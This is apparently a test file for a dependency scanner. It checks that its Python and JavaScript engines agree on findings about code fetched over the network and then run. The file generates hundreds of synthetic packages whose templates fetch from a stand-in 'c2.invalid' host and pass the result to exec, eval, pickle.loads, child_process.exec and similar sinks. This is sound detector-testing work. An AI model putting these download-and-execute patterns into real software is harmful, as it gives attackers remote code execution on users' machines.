"""Engine parity for the cross-file received-code follower (0.1.8, item 10).

core._cross_file_received_issues ran only in the Python engine; its twin is
js/src/lib/crossfile.js (the npm engine's --deps checks run it). Both must
report the same findings — file, line, severity, message and snippet — for
every package:

* the twins' pattern text, flags, name sets and limits are core's;
* the follower's own tests (tests/scanner/test_cross_file_follower.py: the
  forms, the adversarial pass, the crafted false positives, the known misses);
* a seeded stream of generated packages, Python and npm, built from the
  shapes the follower reads (definitions, classes, object literals, exports
  and imports in every form it knows, callbacks, caches, environment
  variables, runners) and the ones it must read past (comments, docstrings,
  strings, astral characters, rows too long to read), whose names collide
  often enough that flows connect.

All content is inert text: hosts are .invalid, nothing is executed.
Skipped where the npm engine is not built (node, and npm run build in js/).
"""
import collections
import json
import os
import random
import re
import subprocess
import unittest

from lazaret.scanner import core
from tests import _support
from tests.architecture.test_js_parity import NODE, NPM_READY, NPM_SKIP
from tests.scanner import test_cross_file_follower as T

CROSSFILE_JS = os.path.join(_support.REPO_ROOT, "js", "src", "lib", "crossfile.js")
# the module is imported by its file:// URL, as the other parity tests do: on
# Windows node refuses a bare absolute path ("Received protocol 'd:'")
NPM = """
import { pathToFileURL } from "node:url";
const { crossFileReceivedIssues, XF_TWINS } = await import(pathToFileURL(process.argv[1]).href);
let buf = '';
process.stdin.on('data', (d) => { buf += d; });
process.stdin.on('end', () => {
  const { cases, onePackage } = JSON.parse(buf);
  const results = cases.map((files) => crossFileReceivedIssues(files, new Set(), 'Dependency code', onePackage)
    .map((i) => [i.file, i.line, i.sev, i.msg, i.snipStart, i.snippet]));
  process.stdout.write(JSON.stringify({ twins: XF_TWINS, results }));
});
"""

U = "'https://c2.invalid/p'"
ASTRAL = "\U0001d41a\U0001f600"


def view(issues):
    return [[i["file"], i["line"], i["sev"], i["msg"], i["snipStart"], i["snippet"]] for i in issues]


def run_npm(cases, one_package=False):
    p = subprocess.run([NODE, "--input-type=module", "-e", NPM, CROSSFILE_JS],
                       input=json.dumps({"cases": cases, "onePackage": one_package}),
                       capture_output=True, encoding="utf-8", errors="replace", timeout=60)
    if p.returncode:
        raise AssertionError(f"node exited {p.returncode}: {p.stderr[-2000:]}")
    out = json.loads(p.stdout)
    return out["twins"], out["results"]


# ---- the generated stream ----------------------------------------------------

PY_SRC = ["requests.get(" + U + ").text", "urlopen(" + U + ").read()", "httpx.get(" + U + ").text",
          "socket.create_connection(('c2.invalid', 1)).recv(99)", "'print(1)'", "os.getenv('HOME')", "x.text"]
PY_SINK = ["exec({})", "eval({})", "json.loads({})", "pickle.loads({})", "importlib.import_module({})", "print({})",
           "subprocess.run({}, shell=True)", "os.system({})", "yaml.load({})"]
JS_SRC = ["(await fetch(" + U + ")).text()", "fetch(" + U + ").then((r) => r.text())", "axios.get(" + U + ")",
          "https.get(" + U + ")", "'console.log(1)'", "process.argv[2]", "r.text()"]
JS_SINK = ["eval({})", "new Function({})()", "vm.runInThisContext({})", "JSON.parse({})", "require({})",
           "console.log({})", "child_process.exec({})", "Function.constructor({})()", "import({})"]
NOISE = ["# exec(pull()) in a comment\n", "'''exec(pull())'''\n", "s = '" + ASTRAL + "exec(pull())'\n",
         "x = '" + "a" * 2100 + "'\n", " \n", "q = \"unclosed\n", "t = '\\\\'  # ' exec(pull())\n",
         "def é():\n    return pull()\n"]
JS_NOISE = ["// eval(pull()) in a comment\n", "/* eval(pull())\n  */\n", "const s = '" + ASTRAL + "eval(pull())';\n",
            "const x = '" + "a" * 2100 + "';\n", " \n", "/* unclosed\n", "const t = `${a}` + '\\\\'; // ' eval(x)\n",
            "const é = () => pull();\n", "const r = /[/]eval(x)/;\n", "if (a) { b({ c: [1, { d }] }); }\n"]


def _py_block(r, f, g, m, C, meth, V, E):
    src, sink = r.choice(PY_SRC), r.choice(PY_SINK)
    use = r.choice([f + "()", g + "()", m + "." + f + "()", "pkg." + m + "." + f + "()", C + "()." + meth + "()",
                    C + "." + meth + "()", "c." + meth + "()", "self.c." + meth + "()", V, V + "['k']",
                    "os.getenv('" + E + "')", "os.environ['" + E + "']", "getattr(" + m + ", '" + f + "')()", "x"])
    return r.choice([
        f"def {f}():\n    return {src}\n",
        f"def {f}():\n    r = {src}\n    return r\n",
        f"def {f}(cb):\n    cb({src})\n",
        f"def {f}(code):\n    {sink.format('code')}\n",
        f"def {f}(): return {src}\n",
        f"class {C}:\n    def {meth}(self):\n        return {src}\n",
        f"class {C}:\n    @staticmethod\n    def {meth}():\n        return {src}\n",
        f"class {C}:\n    @classmethod\n    def {meth}(cls):\n        return {src}\n",
        f"class {C}:\n    {meth} = {src}\n",
        f"class {C}:\n    def __init__(self):\n        self.c = {C}()\n    def go(self):\n        {sink.format(use)}\n",
        f"{V} = {src}\n",
        f"{V} = {{}}\ndef {f}():\n    {V}['k'] = {src}\n",
        f"os.environ['{E}'] = {src}\n",
        f"from .{m} import {f}\n", f"from .{m} import {f} as {g}\n", f"from . import {m}\n",
        f"from .{m} import (\n    {f},\n    {g},\n)\n", f"import pkg.{m} as {g}\n", f"import pkg.{m}\n",
        f"from pkg.{m} import *\n", f"from pkg import {f}\n", f"{g} = importlib.import_module('pkg.{m}')\n",
        f"{g} = __import__('pkg.{m}')\n", f"import requests\n", "import os, json, pickle, subprocess, importlib\n",
        f"{sink.format(use)}\n", f"c = {C}()\n{sink.format('c.' + meth + '()')}\n",
        f"{f}(lambda c: {sink.format('c')})\n", f"{g}({src})\n", f"{sink.format(f + '()')}\n",
        f"def use():\n    \"\"\"Example:\n\n        {sink.format(use)}\n    \"\"\"\n    return {use}\n",
        r.choice(NOISE),
    ])


def _js_block(r, f, g, m, C, meth, V, E, O):
    src, sink = r.choice(JS_SRC), r.choice(JS_SINK)
    use = r.choice([f + "()", g + "()", g + "." + f + "()", "new " + C + "()." + meth + "()", C + "." + meth + "()",
                    "c." + meth + "()", "this.c." + meth + "()", V + ".code", "process.env." + E,
                    "process.env['" + E + "']", g + "['" + f + "']()", "(0, " + g + "." + f + ")()", O + "." + meth + "()",
                    g + ".default()", "x"])
    spec = r.choice(["./" + m, "./" + m + ".js", "../" + m, ".", "..", "./lib/" + m, m])
    return r.choice([
        f"function {f}() {{\n  return {src};\n}}\n",
        f"async function {f}() {{\n  const r = await fetch({U});\n  return r.text();\n}}\n",
        f"const {f} = async () => {src};\n",
        f"const {f} = (cb) => {{\n  https.get({U}, (res) => {{ res.on('end', () => cb(res)); }});\n}};\n",
        f"function {f}() {{\n  return new Promise((resolve) => {{\n    https.get({U}, (res) => resolve(res));\n  }});\n}}\n",
        f"function {f}(code) {{\n  return {sink.format('code')};\n}}\n",
        f"exports.{f} = (code) => {sink.format('code')};\n",
        f"class {C} {{\n  async {meth}() {{\n    return {src};\n  }}\n}}\n",
        f"class {C} {{\n  static async {meth}() {{\n    return {src};\n  }}\n}}\n",
        f"class {C} {{\n  {meth} = async () => {{\n    return {src};\n  }};\n  static data = {src};\n}}\n",
        f"class R {{\n  constructor() {{ this.c = new {C}(); this.d = {src}; }}\n  async go() {{ {sink.format('await ' + use)}; }}\n}}\n",
        f"module.exports = {{\n  async {meth}() {{\n    return {src};\n  }},\n  {f},\n  'q{f}': {g},\n}};\n",
        f"export default {{\n  {f},\n  {meth}: async () => {src},\n}};\n",
        f"const {O} = {{\n  {meth}: async () => {src},\n  v: 1,\n}};\nmodule.exports = {O};\n",
        f"module.exports = {{ {f}, {g} }};\n", f"exports.{f} = {f};\n", f"exports['{f}'] = {f};\n",
        f"module.exports = {f};\n", f"module.exports = function () {{\n  return {src};\n}};\n",
        f"module.exports = class {C} {{\n  async {meth}() {{ return {src}; }}\n}};\n",
        f"export {{ {f} }};\n", f"export {{ {f} as default }};\n", f"export async function {f}() {{\n  return {src};\n}}\n",
        f"export default {f};\n", f"export default async function () {{\n  return {src};\n}}\n",
        f"module.exports = require('{spec}');\n", f"export * from '{spec}';\n", f"export * as {g} from '{spec}';\n",
        f"export {{ {f} }} from '{spec}';\n",
        f"Object.defineProperty(exports, \"{f}\", {{ enumerable: true, get: function () {{ return {m}_1.{f}; }} }});\n",
        f"exports.default = {f};\n",
        f"process.env.{E} = {src};\n", f"const {V} = {{}};\nasync function {f}() {{\n  {V}.code = {src};\n}}\n",
        f"const {{ {f} }} = require('{spec}');\n", f"const {{ {f}: {g} }} = require('{spec}');\n",
        f"const {g} = require('{spec}');\n", f"const {g} = require('{spec}').{f};\n",
        f"import {{ {f} }} from '{spec}';\n", f"import * as {g} from '{spec}';\n", f"import {g} from '{spec}';\n",
        f"const {{ {f} }} = await import('{spec}');\n", f"const {g} = await import('{spec}');\n",
        f"const {g} = require(path.join(__dirname, '{m}'));\n", f"const {g} = require(__dirname + '/{m}');\n",
        f"const {m}_1 = __importDefault(require(\"{spec}\"));\n", "const https = require('https');\n",
        f"{use}.then((c) => {sink.format('c')});\n", f"{use}.then(eval);\n", f"{sink.format('await ' + use)};\n",
        f"{f}((c) => {sink.format('c')});\n", f"const c = new {g}.{C}();\nc.{meth}().then((x) => {sink.format('x')});\n",
        f"{g}(await (await fetch({U})).text());\n", f"fetch({U}).then((r) => r.text()).then({g}.{f});\n",
        r.choice(JS_NOISE),
    ])


PY_FILES = ["pkg/__init__.py", "pkg/_net.py", "pkg/api.py", "pkg/util.py", "pkg/client.py", "pkg/run.py", "pkg/sub/__init__.py",
            "pkg/sub/deep.py", "other/__init__.py", "top.py"]
JS_FILES = ["index.js", "net.js", "api.js", "util.js", "client.js", "run.js", "lib/net.js", "lib/index.js", "lib/run.mjs",
            "net.mjs", "api.cjs", "types/x.js"]


def _py_flow(r, f, g, P, C, meth, V, E):
    """(producer text, consumer imports, consumer pre-statements, the expression holding the value, a runner or None)."""
    src = r.choice(PY_SRC)
    form = r.randrange(16)
    if form == 0:
        return f"def {f}():\n    return {src}\n", f"from .{P} import {f}\n", "", f"{f}()", None
    if form == 1:
        return f"def {f}():\n    r = {src}\n    return r\n", f"from .{P} import {f} as {g}\n", "", f"{g}()", None
    if form == 2:
        return f"def {f}():\n    return {src}\n", f"from . import {P}\n", "", f"{P}.{f}()", None
    if form == 3:
        return f"def {f}(): return {src}\n", f"import pkg.{P} as {g}\n", "", f"{g}.{f}()", None
    if form == 4:
        return f"def {f}():\n    return {src}\n", f"import pkg.{P}\n", "", f"pkg.{P}.{f}()", None
    if form == 5:
        how = r.choice([f"{C}().{meth}()", "c." + meth + "()"])
        return (f"class {C}:\n    def {meth}(self):\n        return {src}\n", f"from .{P} import {C}\n",
                f"c = {C}()\n", how, None)
    if form == 6:
        deco = r.choice(["@staticmethod\n    def " + meth + "():", "@classmethod\n    def " + meth + "(cls):"])
        return f"class {C}:\n    {deco}\n        return {src}\n", f"from .{P} import {C}\n", "", f"{C}.{meth}()", None
    if form == 7:
        return f"class {C}:\n    {meth} = {src}\n", f"from .{P} import {C}\n", "", f"{C}.{meth}", None
    if form == 8:
        return f"{V} = {src}\n", f"from .{P} import {V}\n", "", V, None
    if form == 9:
        return (f"{V} = {{}}\ndef {f}():\n    {V}['k'] = {src}\n", f"from .{P} import {V}, {f}\n", f"{f}()\n", f"{V}['k']", None)
    if form == 10:
        return (f"import os\nos.environ['{E}'] = {src}\n", "import os\n", "",
                r.choice([f"os.getenv('{E}')", f"os.environ['{E}']", f"os.environ.get('{E}')"]), None)
    if form == 11:
        return f"def {f}(cb):\n    cb({src})\n", f"from .{P} import {f}\n", "", "<callback>", f
    if form == 12:
        return f"def {f}(code):\n    {r.choice(PY_SINK).format('code')}\n", f"from .{P} import {f}\n", "", "<runner>", f
    if form == 13:
        return f"def {f}():\n    return {src}\n", f"import importlib\n{g} = importlib.import_module('pkg.{P}')\n", "", f"{g}.{f}()", None
    if form == 14:
        return f"def {f}():\n    return {src}\n", f"from . import {P}\n", "", f"getattr({P}, '{f}')()", None
    return f"def {f}():\n    return {src}\n", f"from .{P} import *\n", "", f"{f}()", None


def _js_flow(r, f, g, P, C, meth, V, E):
    src = r.choice(JS_SRC)
    spec = r.choice(["./" + P, "./" + P + ".js"])
    exp = r.choice([f"module.exports = {{ {f} }};\n", f"exports.{f} = {f};\n", f"exports['{f}'] = {f};\n",
                    f"module.exports.{f} = {f};\n"])
    imp = r.choice([(f"const {{ {f} }} = require('{spec}');\n", f"{f}()"), (f"const {g} = require('{spec}');\n", f"{g}.{f}()"),
                    (f"const {g} = require('{spec}').{f};\n", f"{g}()"), (f"const {{ {f}: {g} }} = require('{spec}');\n", f"{g}()"),
                    (f"const {g} = require(path.join(__dirname, '{P}'));\n", f"{g}.{f}()"),
                    (f"const {g} = __importDefault(require(\"{spec}\"));\n", f"(0, {g}.{f})()")])
    form = r.randrange(16)
    if form >= 14:
        # an event emitter (0.1.8): the value emitted on a module's emitter or process, a listener in the consumer
        ev = r.choice(["code", "data", "boot"])
        send = r.choice([f"fetch({U}).then((r) => r.text()).then((c) => @.emit('{ev}', c));\n",
                         f"(async () => {{\n  const c = await (await fetch({U})).text();\n  @.emit('{ev}', c);\n}})();\n",
                         f"/* {ASTRAL} */ fetch({U}).then((r) => r.text()).then((c) => {{ @ . emit('{ev}', c); }});\n",
                         f"@.emit('{ev}', 'console.log(1)');\nfetch({U});\n",
                         f"fetch({U}).then((r) => r.text()).then((c) => c);\n// @.emit('{ev}', c);\n"])
        if form == 15:
            return send.replace("@", "process"), "", "", f"<listener {ev}>", "process"
        return ("const EventEmitter = require('events');\n" + f"const {V} = new EventEmitter();\n" + send.replace("@", V)
                + f"module.exports = {{ {V} }};\n", f"const {{ {V} }} = require('{spec}');\n", "", f"<listener {ev}>", V)
    if form == 0:
        return f"function {f}() {{\n  return {src};\n}}\n" + exp, imp[0], "", imp[1], None
    if form == 1:
        return f"const {f} = async () => {src};\n" + exp, imp[0], "", imp[1], None
    if form == 2:
        return (f"export async function {f}() {{\n  return {src};\n}}\n", f"import {{ {f} }} from '{spec}';\n", "", f"{f}()", None)
    if form == 3:
        return (f"export default async function () {{\n  return {src};\n}}\n", f"import {g} from '{spec}';\n", "", f"{g}()", None)
    if form == 4:
        return (f"class {C} {{\n  async {meth}() {{\n    return {src};\n  }}\n}}\nmodule.exports = {{ {C} }};\n",
                f"const {{ {C} }} = require('{spec}');\n", f"const c = new {C}();\n",
                r.choice([f"c.{meth}()", f"new {C}().{meth}()"]), None)
    if form == 5:
        return (f"class {C} {{\n  static async {meth}() {{\n    return {src};\n  }}\n}}\nmodule.exports = {{ {C} }};\n",
                f"const {g} = require('{spec}');\n", "", f"{g}.{C}.{meth}()", None)
    if form == 6:
        return (f"module.exports = {{\n  async {meth}() {{\n    return {src};\n  }},\n}};\n", f"const {g} = require('{spec}');\n",
                "", f"{g}.{meth}()", None)
    if form == 7:
        return (f"async function {f}() {{\n  return {src};\n}}\nexport default {{ {f} }};\n", f"import {g} from '{spec}';\n", "",
                f"{g}.{f}()", None)
    if form == 8:
        return (f"const {V} = {{}};\nasync function {f}() {{\n  {V}.code = {src};\n}}\nmodule.exports = {{ {V}, {f} }};\n",
                f"const {{ {V}, {f} }} = require('{spec}');\n", f"{f}();\n", f"{V}.code", None)
    if form == 9:
        return (f"(async () => {{\n  process.env.{E} = {src};\n}})();\n", "", "",
                r.choice([f"process.env.{E}", f"process.env['{E}']"]), None)
    if form == 10:
        return (f"const https = require('https');\nfunction {f}(cb) {{\n  https.get({U}, (res) => {{ res.on('end', () => cb(res)); }});\n}}\n" + exp,
                imp[0], "", "<callback>", imp[1][:-2])
    if form == 11:
        return (f"const https = require('https');\nfunction {f}() {{\n  return new Promise((resolve) => {{\n"
                f"    https.get({U}, (res) => resolve(res));\n  }});\n}}\n" + exp, imp[0], "", imp[1], None)
    if form == 12:
        return (f"function {f}(code) {{\n  return {r.choice(JS_SINK).format('code')};\n}}\n" + exp, imp[0], "", "<runner>", imp[1][:-2])
    return (f"export const {f} = async () => {src};\n", f"const {{ {f} }} = await import('{spec}');\n", "", f"{f}()", None)


def _consumer(r, lang, imports, pre, expr, name):
    sink = r.choice(PY_SINK if lang == "py" else JS_SINK)
    if expr == "<runner>":
        src = r.choice(PY_SRC if lang == "py" else JS_SRC)
        use = f"{name}({src})\n" if lang == "py" else r.choice([f"(async () => {{ {name}({src}); }})();\n",
                                                               f"fetch({U}).then((r) => r.text()).then({name});\n"])
        net = "import requests\n" if lang == "py" else ""
        return net + imports + pre + use
    if expr == "<callback>":
        use = f"{name}(lambda c: {sink.format('c')})\n" if lang == "py" else f"{name}((c) => {sink.format('c')});\n"
        return imports + pre + use
    if expr.startswith("<listener "):
        ev = expr[len("<listener "):-1] if r.random() < 0.85 else "other"
        on = r.choice(["on", "once", "addListener", "prependListener", "prependOnceListener"])
        use = r.choice([f"{name}.{on}('{ev}', (c) => {sink.format('c')});\n",
                        f"{name}.{on}('{ev}', async function (c) {{\n  {sink.format('c')};\n}});\n",
                        f"{name}.{on}('{ev}', eval);\n", f"{name} .{on}( '{ev}' , (x, y) => {sink.format('x')});\n",
                        f"/* {ASTRAL} */ {name}.{on}('{ev}', c => {{ {sink.format('c')}; }});\n",
                        f"// {name}.{on}('{ev}', eval);\n", f"/* {name}.{on}('{ev}', (c) => {sink.format('c')}); */\n"])
        return imports + pre + use
    if lang == "py":
        return imports + pre + sink.format(expr) + "\n"
    return imports + pre + r.choice([f"{expr}.then((c) => {sink.format('c')});\n", f"(async () => {{ {sink.format('await ' + expr)}; }})();\n",
                                     f"{expr}.then(eval);\n"])


def generated(seed, n):
    """`n` packages (dependency file lists) from the seed, Python and npm alternating: one flow from a
    producer file to a consumer file in a random form (its source, sink and names random, so some are
    quiet), and random blocks around it and in other files."""
    r = random.Random(seed)
    out = []
    for k in range(n):
        py = k % 2 == 0
        lang = "py" if py else "js"
        names = dict(f=r.choice(["pull", "load", "get", "fetchIt", "run", "execute", "go"]),
                     g=r.choice(["p", "n", "net", "util", "api", "x"]),
                     C=r.choice(["Client", "C", "Api"]), meth=r.choice(["pull", "get", "data", "run"]),
                     V=r.choice(["CACHE", "cache", "DATA", "state"]), E=r.choice(["PAYLOAD", "CODE", "HOME"]))
        pool = PY_FILES if py else JS_FILES
        rels = r.sample(pool, r.randint(2, 4))
        prod, cons = rels[0], rels[1]
        if py:
            P = prod[len("pkg/"):-3].replace("/__init__", "").replace("/", ".") if prod.startswith("pkg/") else "_net"
            if prod.startswith("pkg/") and prod != "pkg/__init__.py":
                cons = cons if cons.startswith("pkg/") and cons.count("/") == 1 else "pkg/run.py" if prod != "pkg/run.py" else "pkg/api.py"
            flow = _py_flow(r, P=P.split(".")[-1] if "." not in P else P, **names)
        else:
            P = prod.rsplit(".", 1)[0]
            flow = _js_flow(r, P=P.split("/")[-1], **names)
            if "/" in P and "/" not in cons:
                cons = P.split("/")[0] + "/consumer.js"
        texts = {prod: flow[0], cons: _consumer(r, lang, flow[1], flow[2], flow[3], flow[4])}
        for rel in rels[2:]:
            texts.setdefault(rel, "")
        for rel in list(texts):
            for _ in range(r.randint(0, 2)):
                block = _py_block(r, m=names["g"], **{k2: v for k2, v in names.items()}) if py else \
                    _js_block(r, m=names["g"], O="api", **names)
                texts[rel] = block + texts[rel] if r.random() < 0.5 else texts[rel] + block
            if r.random() < 0.08:
                texts[rel] = texts[rel].replace("\n", "\n    ", 1)       # an indent the parsers must read past
        prefix = "venv/lib/python3.12/site-packages/" if py else "node_modules/pkg/"
        out.append([{"path": prefix + rel, "lang": lang, "dep": True, "content": text} for rel, text in texts.items()])
    return out


def curated():
    cases = []
    for label, files, _want in T.PY_CASES:
        cases.append((label, T.py(files)))
    for label, files in T.PY_QUIET:
        cases.append((label, T.py(files)))
    for label, files, _want in T.JS_CASES:
        cases.append((label, T.js(files)))
    for label, files in T.JS_QUIET:
        cases.append((label, T.js(files)))
    for label, files, _want in T.ADVERSARIAL:
        cases.append((label, files))
    for label, files in T.ADVERSARIAL_QUIET + T.KNOWN_MISSES:
        cases.append((label, files))
    return cases


@unittest.skipUnless(NPM_READY, NPM_SKIP)
class CrossFileParityTests(unittest.TestCase):
    maxDiff = None

    @classmethod
    def setUpClass(cls):
        cls.curated = curated()
        cls.stream = generated(20260928, 700)
        cases = [files for _l, files in cls.curated] + cls.stream
        cls.want = [view(core._cross_file_received_issues(files)) for files in cases]
        cls.twins, cls.got = run_npm(cases)

    def test_pattern_text_names_and_limits_are_cores(self):
        for name, (src, flags) in self.twins["patterns"].items():
            with self.subTest(pattern=name):
                rx = getattr(core, name)
                self.assertEqual(src, rx.pattern)
                self.assertEqual(flags, ("m" if rx.flags & re.M else "") + ("i" if rx.flags & re.I else ""))
                self.assertFalse(rx.flags & re.S)
        core_patterns = {n for n in dir(core) if n.startswith("_XF_") and isinstance(getattr(core, n), re.Pattern)}
        self.assertEqual(set(self.twins["patterns"]), core_patterns)
        for name, names in self.twins["sets"].items():
            with self.subTest(names=name):
                self.assertEqual(sorted(names), sorted(getattr(core, name)))
        core_limits = {n: getattr(core, n) for n in dir(core) if n.startswith("_XF_") and type(getattr(core, n)) is int}
        self.assertEqual(self.twins["limits"], core_limits)

    def test_the_followers_own_cases_agree(self):
        n = len(self.curated)
        for (label, _files), want, got in zip(self.curated, self.want[:n], self.got[:n]):
            with self.subTest(label):
                self.assertEqual(got, want)

    def test_the_generated_packages_agree(self):
        n = len(self.curated)
        bad = [(k, want, got) for k, (want, got) in enumerate(zip(self.want[n:], self.got[n:])) if want != got]
        self.assertEqual(bad[:3], [])

    def test_the_stream_reaches_every_path(self):
        """Guards the comparison against a stream that stopped exercising
        something: each count is well above zero for this seed."""
        n = len(self.curated)
        counts = collections.Counter()
        for files, issues in zip(self.stream, self.want[n:]):
            lang = files[0]["lang"]
            counts[lang + " packages"] += 1
            if issues and any("emit(" in f["content"] for f in files):
                counts["js emitter"] += 1
            for i in issues:
                kind = "runner" if "the function that runs it" in i[3] else "received"
                cat = i[3].split(";")[0].split(" ", 2)[2]
                counts[f"{lang} {kind}"] += 1
                counts[cat] += 1
        self.assertGreaterEqual(counts["py received"], 40, counts)
        self.assertGreaterEqual(counts["js received"], 40, counts)
        self.assertGreaterEqual(counts["py runner"], 5, counts)
        self.assertGreaterEqual(counts["js runner"], 5, counts)
        self.assertGreaterEqual(counts["js emitter"], 5, counts)
        for cat in ("runs code it receives over the network", "deserializes data it receives over the network",
                    "loads a module named by data it receives over the network"):
            self.assertGreaterEqual(counts[cat], 5, counts)

    def test_one_distribution(self):
        """A registry scan's reading (one_package): every Python module one package."""
        cases = [T.py({"a.py": T.PY_NET, "b.py": "from a import pull\nexec(pull())\n"})] + generated(7, 60)
        want = [view(core._cross_file_received_issues(files, one_package=True)) for files in cases]
        _twins, got = run_npm(cases, one_package=True)
        self.assertEqual(got, want)
        self.assertTrue(want[0])


if __name__ == "__main__":
    unittest.main()
